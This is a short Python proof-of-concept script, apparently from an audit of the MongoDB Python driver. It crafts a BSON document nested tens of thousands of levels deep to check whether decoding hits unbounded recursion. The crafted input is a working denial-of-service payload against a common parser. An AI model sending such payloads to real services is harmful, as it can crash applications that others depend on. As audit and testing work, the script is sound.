import sys, struct, os

def build_nested_doc(depth):
    # flat O(depth) construction, same layout math as the Go PoC:
    # stride 7 bytes/level header, total = 5 + 8*depth, trailing `depth` zero
    # terminator bytes (already zero from bytearray init).
    total = 5 + 8 * depth
    buf = bytearray(total)
    for k in range(depth):
        off = k * 7
        length_k = 5 + 8 * (depth - k)
        struct.pack_into('<i', buf, off, length_k)
        buf[off+4] = 0x03  # type: document
        buf[off+5] = ord('a')
        buf[off+6] = 0x00
    inner_off = depth * 7
    struct.pack_into('<i', buf, inner_off, 5)
    buf[inner_off+4] = 0x00
    return bytes(buf)

if __name__ == "__main__":
    depth = int(sys.argv[1]) if len(sys.argv) > 1 else 50000
    raise_limit = len(sys.argv) > 2 and sys.argv[2] == "raiselimit"
    if raise_limit:
        sys.setrecursionlimit(100000)
    sys.path.insert(0, '/home/user/mongo-python-driver-audit')
    import bson
    print(f"recursion limit={sys.getrecursionlimit()}, depth={depth}", file=sys.stderr)
    data = build_nested_doc(depth)
    print(f"built {len(data)} bytes, decoding...", file=sys.stderr)
    try:
        bson.BSON(data).decode()
        print("decoded OK (unexpected)", file=sys.stderr)
    except Exception as e:
        print(f"caught (safe): {type(e).__name__}: {e}", file=sys.stderr)
